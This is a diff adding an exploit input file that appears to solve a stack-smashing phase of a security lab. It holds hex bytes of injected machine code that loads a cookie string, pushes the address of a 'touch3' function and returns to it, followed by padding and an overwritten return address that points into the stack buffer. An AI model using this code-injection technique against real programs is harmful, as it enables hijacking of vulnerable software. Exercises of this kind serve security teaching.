@@ -1,0 +1,16 @@
+/* Injected code sum up to 24 bytes */
+48 bf 35 39 62 39 39
+37 66 61  		/* movabs $0x6166373939623935bf48,%rdi -- Cookie string (10 bytes) */
+57                   	/* push   %rdi -- Push cookie to stack (1 byte) */
+48 c7 c7 98 dc 61 55 	/* mov    $0x5561dc98,%rdi -- Set the first parameter as start position of input string (7 bytes) */
+68 fa 18 40 00       	/* push   $0x4018fa -- Push &touch3 to stack (5 bytes) */
+c3                   	/* ret -- Switch control to function 'touch3' (1 byte) */
+
+
+/* Placeholder, 16 bytes */
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00
+
+/* Corrupt the next instruction to be our injected code */
+78 dc 61 55 00 00 00 00
